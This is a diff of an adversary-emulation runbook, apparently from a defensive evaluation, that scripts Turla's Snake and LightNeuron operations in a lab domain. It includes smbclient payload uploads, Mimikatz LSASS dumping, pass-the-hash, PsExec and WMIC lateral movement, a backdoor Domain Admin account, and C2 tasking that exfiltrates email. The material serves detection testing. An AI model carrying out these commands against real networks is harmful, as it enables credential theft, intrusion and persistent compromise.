@@ -1,6 +1,7 @@
 # Snake Protections Scenario
 
 Legend of symbols:
+
 * :bulb: - callout notes
 * :heavy_exclamation_mark: - extremely important note
 * :arrow_right: - Switching to another session
@@ -37,7 +38,7 @@ cd /opt/day2/turla/Resources/control_server
 
 :microphone: `Voice Track:`
 
-Test 8 emulates Turla's initial access attempt via a watering hole attack 
+Test 8 emulates Turla's initial access attempt via a watering hole attack
 targeting user `Egle`, who downloads the EPIC dropper.
 
 ---
@@ -93,6 +94,7 @@ Test 9 emulates execution of the EPIC installer to achieve initial access and pe
 :arrow_right: Return to your Kali C2 server
 
 * Open a new terminal tab and name it `smbclient`. Copy the EPIC dropper executable to Windows host, Azuolas:
+
 ```bash
 smbclient -U 'nk\EgleAdmin'%'Producer1!' //10.100.40.103/c$ -c 'put /opt/day2/turla/Resources/EPIC/SimpleDropper/SimpleDropper/bin/SimpleDropper_https.exe Users\egle\Downloads\NFVersion_5e.exe'
 ```
@@ -124,8 +126,7 @@ confirm that a new implant has registered and the automated discovery output has
 the server log.
 
 **NOTE:** The injector will wait **2 minutes**, before injecting EPIC's Guard DLL into explorer.exe
-and, subsequently, EPIC's worker DLL into Microsoft Edge. 
-
+and, subsequently, EPIC's worker DLL into Microsoft Edge.
 
 * Within the terminal window, split your terminal horizontally via right-click -> split terminal. Be careful not to accidentally terminate the control server.
 
@@ -172,12 +173,11 @@ cd /opt/day2/turla/Resources/control_server
 * <https://www.welivesecurity.com/2020/03/12/tracking-turla-new-backdoor-armenian-watering-holes/>
 * <https://www.welivesecurity.com/2017/06/06/turlas-watering-hole-campaign-updated-firefox-extension-abusing-instagram/>
 
-
 ## Test 10: Install Snake on First Target
 
 :microphone: `Voice Track:`
 
-Test 10 emulates Turla exploiting a vulnerable driver to install the Snake rootkit 
+Test 10 emulates Turla exploiting a vulnerable driver to install the Snake rootkit
 on the `Azuolas` system and then performing discovery on `Azuolas` to
 discover a file server and associated file server admin.
 
@@ -188,9 +188,11 @@ discover a file server and associated file server admin.
 * :arrow_right: Switch to your RDP session to `azuolas` as `egle`.
 
 * Open a Powershell prompt and run the following command:
+
 ```pwsh
 runas /user:nk\egleadmin powershell
 ```
+
 * When prompted, type in the password for `EgleAdmin`:
 
 | Username   | Password |
@@ -198,6 +200,7 @@ runas /user:nk\egleadmin powershell
 | nk\EgleAdmin | Producer1! |
 
 * A new powershell window should pop up. Run the following command to ensure that you are running as `nk\EgleAdmin`:
+
 ```pwsh
 whoami
 ```
@@ -205,6 +208,7 @@ whoami
 :arrow_right: Return to your Kali C2 server terminal window
 
 * From your `smbclient` Kali terminal tab, transfer the Snake installer to `Azuolas`.
+
 ```bash
 smbclient -U 'nk\EgleAdmin'%'Producer1!' //10.100.40.103/c$ -c 'put /opt/day2/turla/Resources/payloads/epic/snake.exe Users\egle\Desktop\gusbsys.exe'
 ```
@@ -214,6 +218,7 @@ smbclient -U 'nk\EgleAdmin'%'Producer1!' //10.100.40.103/c$ -c 'put /opt/day2/tu
 * Open File Explorer and browse to Desktop
 
 * From the `egle` (:heavy_exclamation_mark: NOT `egleadmin`) powershell terminal, run the following command to execute the Snake rootkit installer with the privilege escalation option:
+
 ```powershell
 C:\Users\Egle\Desktop\gusbsys.exe -f
 ```
@@ -225,6 +230,7 @@ C:\Users\Egle\Desktop\gusbsys.exe -f
 :arrow_right: Return to your Kali C2 server terminal window.
 
 * From your lower Kali C2 terminal window, task the Snake rootkit to run the following process discovery command:
+
 ```bash
 # Discover running processes
 cd /opt/day2/turla/Resources/control_server
@@ -232,28 +238,34 @@ cd /opt/day2/turla/Resources/control_server
 ```
 
 * :heavy_exclamation_mark: Verify that the enumerated processes output contains a process running under `EgleAdmin`
+
 ```bash
 grep 'NK\\EgleAdmin' logs.txt -i
 ```
 
 > This should return output similar to the following:
->    ```
->    powershell.exe                2868 RDP-Tcp#6                  5     79,140 K Unknown         NK\egleadmin                                            0:00:00 N/A
->    conhost.exe                   7368 RDP-Tcp#6                  5     18,088 K Unknown         NK\egleadmin                                            0:00:00 N/A
+>
+> ```text
+> powershell.exe                2868 RDP-Tcp#6                  5     79,140 K Unknown         NK\egleadmin                                            0:00:00 N/A
+> conhost.exe                   7368 RDP-Tcp#6                  5     18,088 K Unknown         NK\egleadmin                                            0:00:00 N/A
 >    ```
 
 * Wait 1 minute then execute the next discovery command to enumerate `EgleAdmin`'s groups:
+
 ```bash
 # Enumerate details on EgleAdmin to find group membership
 ./evalsC2client.py --set-task 534b40585d514b554844 '{"type": 3, "proc": "net.exe", "args": "user /domain EgleAdmin"}'
 ```
+
 :heavy_exclamation_mark: Verify that `File Server Admins` is listed as one of the groups that `EgleAdmin` is a member of.
 
 * Wait 1 minute then execute the next discovery command to the drive mapped to the file server:
+
 ```bash
 # Discover that the local machine has a drive mapped to the file server
 ./evalsC2client.py --set-task 534b40585d514b554844 '{"type": 3, "proc": "net.exe", "args": "use", "runas": "nk\\Egle"}'
 ```
+
 :heavy_exclamation_mark: Verify that the home drive is mapped to the file server host `berzas (10.100.30.204)`.
 
 ---
@@ -297,13 +309,12 @@ grep 'NK\\EgleAdmin' logs.txt -i
 * [Report 28: CoreLabs- VirtualBox Privilege Escalation](https://www.coresecurity.com/core-labs/advisories/virtualbox-privilege-escalation-vulnerability)
 * [Report 29: Unit42- Acidbox](https://unit42.paloaltonetworks.com/acidbox-rare-malware/)
 
-
 ## Test 11: Snake Lateral Movement to File Server
 
 :microphone: `Voice Track:`
 
 Test 11 emulates Turla using the discovered admin account to laterally move to the file server and install the Snake rootkit on it, and then
-using Powershell to perform Active Directory user, group, and computer discovery. 
+using Powershell to perform Active Directory user, group, and computer discovery.
 
 ---
 
@@ -331,6 +342,7 @@ smbclient -U 'nk\EgleAdmin'%'Producer1!' //10.100.40.103/c$ -c 'put /opt/day2/tu
 * Open File Explorer and browse to `C:\Windows\System32`. Order files by date.
 
 * In the :heavy_exclamation_mark: `EgleAdmin` Powershell terminal, run the following command to execute PsExec, which will run the Snake installer on the file server `berzas`:
+
 ```powershell
 C:\Windows\System32\file_svc_mgr.exe \\berzas -accepteula -s -c "C:\Windows\System32\cmu_svc_v2.exe"
 ```
@@ -344,16 +356,20 @@ C:\Windows\System32\file_svc_mgr.exe \\berzas -accepteula -s -c "C:\Windows\Syst
 :arrow_right: Check the Kali C2 server terminal window and verify that a new implant session is beaconing back to the C2 server.
 
 * From your lower Kali C2 control server terminal window, task Snake to check if the `ActiveDirectory` PowerShell module is installed.
+
 ```bash
 ./evalsC2client.py --set-task 5054474d50435a51404b '{"type": 2, "command": "$ProgressPreference = \"SilentlyContinue\"; Get-Module -ListAvailable -Name ActiveDirectory"}'
 ```
+
 :heavy_exclamation_mark: Verify that you see output. If the implant returns empty output, please contact your lead.
 
-* Wait 1 minute before tasking Snake to collect a list of Active Directory groups containing the word "management", 
+* Wait 1 minute before tasking Snake to collect a list of Active Directory groups containing the word "management",
 as members of these groups will likely have elevated permissions on the network.
+
 ```bash
 ./evalsC2client.py --set-task 5054474d50435a51404b '{"type": 2, "command": "$ProgressPreference = \"SilentlyContinue\"; Import-Module ActiveDirectory; Get-ADGroup -Filter * | Where-Object Name -Match \"management\" | Select Name"}'
 ```
+
 :heavy_exclamation_mark: Verify that `Server Management` is included in the results.
 
 * Wait 1 minute before tasking Snake to obtain the usernames of accounts within the `Server Management` domain group. This will instruct Turla on users to target next.
@@ -361,24 +377,30 @@ as members of these groups will likely have elevated permissions on the network.
 ```bash
 ./evalsC2client.py --set-task 5054474d50435a51404b '{"type": 2, "command": "$ProgressPreference = \"SilentlyContinue\"; Import-Module ActiveDirectory; Get-ADGroupMember -Identity \"Server Management\" | Select Name,SamAccountName"}'
 ```
+
 :heavy_exclamation_mark: Verify that `ZilvinasAdmin` shows up in the list of accounts.
 
 * Wait 1 minute before tasking Snake to obtain the usernames of accounts within the `Domain Admins` domain group.
+
 ```bash
 ./evalsC2client.py --set-task 5054474d50435a51404b '{"type": 2, "command": "$ProgressPreference = \"SilentlyContinue\"; Import-Module ActiveDirectory; Get-ADGroupMember -Identity \"Domain Admins\" | Select Name,SamAccountName"}'
 ```
+
 :heavy_exclamation_mark: Verify that `ZilvinasAdmin` shows up in the list of accounts.
 
 * Wait 1 minute before tasking Snake to discover domain users. Ensure
 `Zilvinas` and `ZilvinasAdmin` appear in the output.
+
 ```bash
 ./evalsC2client.py --set-task 5054474d50435a51404b '{"type": 2, "command": "$ProgressPreference = \"SilentlyContinue\"; Import-Module ActiveDirectory; Get-ADUser -Filter {LastLogonDate -ne 0} -Properties * | Select Name,SamAccountName"}'
 ```
 
 * Finally, wait 1 minute before tasking Snake to obtain a list of domain computers and some of their information (IP addresses, DNS names, and description).
+
 ```bash
 ./evalsC2client.py --set-task 5054474d50435a51404b '{"type": 2, "command": "$ProgressPreference = \"SilentlyContinue\"; Import-Module ActiveDirectory; Get-ADComputer -Filter * -Properties * | Select Name,DnsName,IPv4Address,Description"}'
 ```
+
 :heavy_exclamation_mark: Ensure that `Zilvinas' Workstation` appears in the `Description` field for `uosis`
 
 ---
@@ -433,6 +455,7 @@ Test 12 emulates Turla performing credential dumping on the file server, and the
 | nk\ZilvinasAdmin | Producer2! |
 
 * A new powershell window should pop up. Run the following command to ensure that you are running as `nk\ZilvinasAdmin`:
+
 ```pwsh
 whoami
 ```
@@ -440,6 +463,7 @@ whoami
 :arrow_right: Return to your Kali C2 server
 
 * From the `smbclient` Kali terminal tab, copy MimiKatz, PsExec, and the Snake installer, to the file server `berzas`:
+
 ```bash
 smbclient -U 'nk\EgleAdmin'%'Producer1!' //10.100.30.204/c$ -c 'put /opt/day2/turla/Resources/payloads/snake/mimikatz.exe Windows\System32\loadperf.exe'
 smbclient -U 'nk\EgleAdmin'%'Producer1!' //10.100.30.204/c$ -c 'put /opt/day2/turla/Resources/payloads/snake/PsExec.exe Windows\System32\fs_mgr.exe'
@@ -457,34 +481,38 @@ smbclient -U 'nk\EgleAdmin'%'Producer1!' //10.100.30.204/c$ -c 'put /opt/day2/tu
 | nk\EgleAdmin  | Producer1! |
 
 * In the admin cmd prompt, run Mimikatz to dump all NTLM hashes from `LSASS.exe`:
+
 ```bat
 C:\Windows\System32\loadperf.exe pr::d slsa::lop quit 
 ```
+
 * :heavy_exclamation_mark: Verify that the password and NTLM hash for `ZilvinasAdmin` appears in the output.
   * In the Command Prompt, press CTRL+F and in the "Find what:" field, enter
   `* Username : ZilvinasAdmin`
   * You may have to go up a few results to find the hash and password
   * The output should contain:
-  * >    ```
-    >        * Username : ZilvinasAdmin
-    >        * Domain   : NK
-    >        * NTLM     : f3fcd61f987a97da49ce5f650b4e6539
-    >        * SHA1     : fc8c801521140666c793108b67716caf4c4189f4
-    >        * DPAPI    : b06d7bea8849897b811e1d73ab22726c
-    >        tsPkG :	
-    >    --
-    >        * Username : ZilvinasAdmin
-    >        * Domain   : NK
-    >        * Password : Producer2!
-    >        kErberoS :	
-    >        * Username : ZilvinasAdmin
-    >        * Domain   : NK.LOCAL
-    >        * Password : (null)
-    >        sSp :	
-    >        crEdMan :
+>
+* > ```text
+    >     * Username : ZilvinasAdmin
+    >     * Domain   : NK
+    >     * NTLM     : f3fcd61f987a97da49ce5f650b4e6539
+    >     * SHA1     : fc8c801521140666c793108b67716caf4c4189f4
+    >     * DPAPI    : b06d7bea8849897b811e1d73ab22726c
+    >     tsPkG : 
+    > --
+    >     * Username : ZilvinasAdmin
+    >     * Domain   : NK
+    >     * Password : Producer2!
+    >     kErberoS : 
+    >     * Username : ZilvinasAdmin
+    >     * Domain   : NK.LOCAL
+    >     * Password : (null)
+    >     sSp : 
+    >     crEdMan :
     >    ```
 
 * Wait 1 minute and then in the same elevated cmd prompt, perform pass-the-hash via MimiKatz using `ZilvinasAdmin`'s NTLM hash to run PsExec and install Snake on the target workstation.
+
 ```bat
 C:\Windows\System32\loadperf.exe pr::d "slsa::htp /user:ZilvinasAdmin /ntlm:f3fcd61f987a97da49ce5f650b4e6539 /domain:nk.local /remotepc:uosis /pexe:C:\Windows\System32\fs_mgr.exe /sys:1 /prun:C:\Windows\System32\cmu_svc.exe" quit
 ```
@@ -502,12 +530,14 @@ sessions for indicators of blocked activity.
 
 * Spend a couple minutes reading through any unread emails to wait for the implant to start beaconing back to the C2 server.
 
-:arrow_right: Return to the Kali C2 terminal window and verify that a new implant session is beaconing back to the C2 server. 
+:arrow_right: Return to the Kali C2 terminal window and verify that a new implant session is beaconing back to the C2 server.
 
 * From the lower terminal window, task Snake to enumerate running processes on the machine to discover processes under `ZilvinasAdmin`.
+
 ```bash
 ./evalsC2client.py --set-task 475e465e424557475b42 '{"type": 3, "proc": "tasklist.exe", "args": "/v"}'
 ```
+
 * :heavy_exclamation_mark: Verify that we find processes running under `ZilvinasAdmin`
 
 ```bash
@@ -516,18 +546,19 @@ grep 'NK\\ZilvinasAdmin' logs.txt -i
 
 > This should return output similar to the following:
 >
->```
+>```text
 >powershell.exe                8152 RDP-Tcp#2                  3     83,280 K Unknown         NK\ZilvinasAdmin                                        0:00:00 N/A
 >conhost.exe                    312 RDP-Tcp#2                  3     17,356 K Unknown         NK\ZilvinasAdmin                                        0:00:00 N/A
 >```
 
-
 * Wait 1 minute, then instruct Snake to create a new domain user `Leshy` using an access token from one of the `ZilvinasAdmin` processes. `Leshy` will be used as a backdoor domain admin account for persistence on the domain.
+
 ```bash
 ./evalsC2client.py --set-task 475e465e424557475b42 '{"type": 1, "command": "net user leshy Password12345 /add /domain", "runas": "nk\\zilvinasadmin"}'
 ```
 
 * Wait 1 minute, then instruct Snake to add `Leshy` to the `Domain Admins` group.
+
 ```bash
 ./evalsC2client.py --set-task 475e465e424557475b42 '{"type": 1, "command": "net group \"Domain Admins\" leshy /add /domain", "runas": "nk\\zilvinasadmin"}'
 ```
@@ -563,8 +594,8 @@ grep 'NK\\ZilvinasAdmin' logs.txt -i
 
 :microphone: `Voice Track:`
 
-Test 13 emulates Turla laterally moving to the Exchange server, installing the LightNeuron implant there, 
-and sending several discovery commands to the LightNeuron implant and collecting and exfiltrating email traffic. 
+Test 13 emulates Turla laterally moving to the Exchange server, installing the LightNeuron implant there,
+and sending several discovery commands to the LightNeuron implant and collecting and exfiltrating email traffic.
 
 ---
 
@@ -579,6 +610,7 @@ and sending several discovery commands to the LightNeuron implant and collecting
 :arrow_right: Return to your Kali C2 server
 
 * In your Kali terminal window, copy the LightNeuron files to `uosis`
+
 ```bash
 sudo smbclient -U 'nk\ZilvinasAdmin'%'Producer2!' //10.100.40.102/c$ -c 'put /opt/day2/turla/Resources/payloads/snake/ln_transport_agent.dll Windows\System32\mtxconf.dll'
 sudo smbclient -U 'nk\ZilvinasAdmin'%'Producer2!' //10.100.40.102/c$ -c 'put /opt/day2/turla/Resources/payloads/snake/n_installer_aux.dll Windows\System32\mtxcli.dll'
@@ -598,34 +630,41 @@ sudo smbclient -U 'nk\ZilvinasAdmin'%'Producer2!' //10.100.40.102/c$ -c 'put /op
 | nk\ZilvinasAdmin  | Producer2! |
 
 * In the elevated cmd prompt, run the following commands to copy LightNeuron files. After each command, check your RDP session to `drebule (10.100.30.203)` to look for any indicators of blocked vendor activity.
+
 ```bat
 copy C:\Windows\System32\mtxconf.dll "\\drebule\C$\Program Files\Microsoft\Exchange Server\V15\TransportRoles\agents\Hygiene\Microsoft.Exchange.Transport.Agent.ConnectionFiltering.dll"
 ```
 
 * Wait 1 minute before copying the next file (LightNeuron companion DLL):
+
 ```bat
 copy C:\Windows\System32\mtxcli.dll "\\drebule\C$\Program Files\Microsoft\Exchange Server\v15\bin\exdbdata.dll"
 ```
 
 * Wait 1 minute before copying the next file (installation script):
+
 ```bat
 copy C:\Windows\System32\msiex.ps1 \\drebule\C$\Windows\System32\msiex.ps1
 ```
 
 * Wait 1 minute before copying the rules file:
+
 ```bat
 copy C:\Windows\System32\wdr.rules.xml \\drebule\C$\Windows\ServiceProfiles\NetworkService\AppData\Local\Temp\msmdat.xml
 ```
 
 * Wait 1 minute before copying the last config file:
+
 ```bat
 copy C:\Windows\System32\perfe009.dat "\\drebule\C$\Program Files\Microsoft\Exchange Server\v15\bin\winmail.dat"
 ```
 
 * Wait 1 minute and then run the following command in the elevated cmd prompt to install LightNeuron remotely using WMI and Powershell:
-```
+
+```cmd
 wmic /node:drebule /privileges:enable /output:STDOUT process call create "cmd.exe /c powershell.exe -File C:\Windows\System32\msiex.ps1 > C:\Windows\Temp\msiexinstallation.log 2>&1"
 ```
+
 :heavy_exclamation_mark: Verify that the WMIC output shows a `ReturnValue` of 0.
 
 * Check your RDP session to `drebule (10.100.30.203)` to look for any indicators of blocked activity.
@@ -633,26 +672,30 @@ wmic /node:drebule /privileges:enable /output:STDOUT process call create "cmd.ex
 :arrow_right: Return to your RDP session to `uosis (10.100.40.102)` as `ZilvinasAdmin`.
 
 * Wait 1 minute and then run the following command in the elevated cmd prompt to check the installation log for any errors:
+
 ```bat
 type \\drebule\C$\Windows\Temp\msiexinstallation.log
 ```
+
 :heavy_exclamation_mark: If the output contains any errors, notify your lead.
 
 :arrow_right: Return to your Kali C2 server
 
 * From the Kali C2 lower terminal window, task LightNeuron to perform system
 network configuration discovery:
+
 ```bash
 ./evalsC2client.py --set-task info@nk.local '5 | ipconfig /all'
 ```
 
-
 * :heavy_exclamation_mark: If no response is received after 5 minutes, check
 the postfix logs on the Kali server to make sure the email was intercepted and
 processed correctly by LightNeuron.
+
   ```bash
   grep postfix /var/log/syslog
   ```
+
   * If there is a `reject` entry, that means the email, destined for a
   nonexistent user, was processed by the Exchange server, meaning that
   LightNeuron was either not successfully installed or is not working properly.
@@ -661,14 +704,14 @@ processed correctly by LightNeuron.
 for any indicators of blocked activity.
 
 * Open File Explorer and browse to `C:\Windows\serviceprofiles\networkservice\appdata\Roaming\Microsoft\Windows`
-    * Confirm the presence of an `msxfer.dat`, this implies the LightNeuron
+  * Confirm the presence of an `msxfer.dat`, this implies the LightNeuron
     transport agent was successfully installed and intercepted the email
     containing C2 commands
 
-* :arrow_right: Return to your RDP session to `uosis (10.100.40.102)` as `Zilvinas`. 
- 
+* :arrow_right: Return to your RDP session to `uosis (10.100.40.102)` as `Zilvinas`.
+
 * Go to your Edge browser window with the OWA page. If you do not have an Edge
-browser with OWA open from a previous step, open Edge then navigate to 
+browser with OWA open from a previous step, open Edge then navigate to
 `https://drebule.nk.local/owa` and log in as `Zilvinas`:
 
 | Username   | Password |
@@ -676,10 +719,11 @@ browser with OWA open from a previous step, open Edge then navigate to
 | nk\Zilvinas  | Producer2! |
 
 * Create a new email:
- * The email recipient should be the user `egle@nk.local`
- * The email subject should be `SAP Integration Issue`
- * The following text should be pasted in as the email body:
-   ```
+* The email recipient should be the user `egle@nk.local`
+* The email subject should be `SAP Integration Issue`
+* The following text should be pasted in as the email body:
+
+   ```text
    Hi Egle,
    After our meeting earlier I spoke with Tenko about the SAP integration issue that was preventing the users from logging in. I did a little digging and noticed there is an authentication error on the SAP server.
 
@@ -688,15 +732,16 @@ browser with OWA open from a previous step, open Edge then navigate to
 
 * Send the email
 
-:arrow_right: Switch to your RDP window to `Azuolas (10.100.40.103)` as `Egle`. 
+:arrow_right: Switch to your RDP window to `Azuolas (10.100.40.103)` as `Egle`.
 
 * Go to your Edge browser window. You should still be logged into OWA from earlier.
 
 * You should see the email from `Zilvinas@nk.local`. Try reloading the page if needed.
 
 * Reply to the email from Zilvinas.
- * The following text should be pasted in as the email reply body:
-   ```
+* The following text should be pasted in as the email reply body:
+
+   ```text
    Zilvinas,
 
    I just checked on the service account. It appears that the account was still active, but the password had expired. I've adjusted the settings for the account, so the password should not expire again.
@@ -709,12 +754,14 @@ browser with OWA open from a previous step, open Edge then navigate to
 * Send the email
 
 :arrow_right: Return to the Kali C2 server lower terminal window. Task the LightNeuron implant to exfiltrate the email log file:
+
 ```bash
 ./evalsC2client.py --set-task info@nk.local '3 | 0'
 ```
 
 * The file contents will be logged by the control server.
 :heavy_exclamation_mark: Verify that exfil was logged by the control server by checking the terminal window with the server output or by checking the server log file. The logs should contain the password Egle sent to Zilvinas:
+
 ```bash
 grep 'dfsbH%T5RWf3bwq3aeGR$3%' /opt/day2/turla/Resources/control_server/logs.txt
 ```
